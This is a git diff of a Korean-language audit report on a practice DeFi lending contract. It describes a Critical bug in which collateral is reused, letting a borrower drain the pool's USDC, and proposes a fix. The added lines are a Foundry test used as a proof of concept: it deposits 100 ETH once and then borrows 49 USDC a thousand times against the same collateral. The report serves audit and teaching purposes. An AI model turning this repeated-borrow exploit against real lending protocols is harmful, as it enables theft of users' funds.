@@ -111,6 +111,72 @@ dex의 모든 usdc를 빼낼 수 있기 때문에 Critical이다.
 ### 해결 방안
 대출을 해주었을 때 담보금에 대한 체크를 하는 체크 루틴을 따로 추가하여 담보금이 재사용되는 것을 방지해야 한다.
 aave 같은 경우 이를 막기 위해서 debt 토큰을 따로 만들고 관리하여 debt 토큰의 발행량으로 이를 체크한다.
+```// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "../lib/forge-std/src/Test.sol";
+import "src/Lending.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract USDC is ERC20 {
+    uint public constant USDC_INITIAL_SUPPLY = 1000 ether;
+    constructor() ERC20("USD Coin", "USDC") {
+        super._mint(msg.sender, USDC_INITIAL_SUPPLY);
+    }
+    function mint(address to, uint amount) public
+    {
+        _mint(to, amount);
+    }
+}
+
+contract ETH is ERC20 {
+    uint public constant USDC_INITIAL_SUPPLY = 1000 ether;
+    constructor() ERC20("ETH coin", "ETH") {
+        super._mint(msg.sender, USDC_INITIAL_SUPPLY);
+    }
+
+    function mint(address to, uint amount) public
+    {
+        _mint(to, amount);
+    }
+}
+
+contract LendingTest is Test {
+
+    MyLend bank;
+    DreamOracle oracle;
+    USDC usdc;
+    ETH eth;
+
+    function setUp() public {
+        oracle = new DreamOracle();
+        usdc = new USDC();
+        eth = new ETH();
+        bank = new MyLend(address(usdc), address(eth),address(oracle));
+       // vm.deal(address(bank), 10 ether); 
+        vm.deal(address(this), 100 ether);
+        
+
+    }
+
+    function testDepositBasic1() public {
+        address depositor = address(0x11);
+        address borrower = address(0x12);
+        
+        eth.mint(address(this), 100 ether);
+        eth.approve(address(bank), 100 ether);
+        bank.deposit(address(eth), 100 ether);
+        usdc.mint(address(bank), 10000000000000 ether);
+        oracle.setPrice(address(eth), 1 ether);
+        for(uint i=0; i<1000; i++)
+        {
+            bank.borrow(address(usdc), 49 ether);
+        }
+        usdc.balanceOf(address(this));
+    }
+} 
+```
 
 ## rkdnjs / lending / 무한 대출
 ### 설명
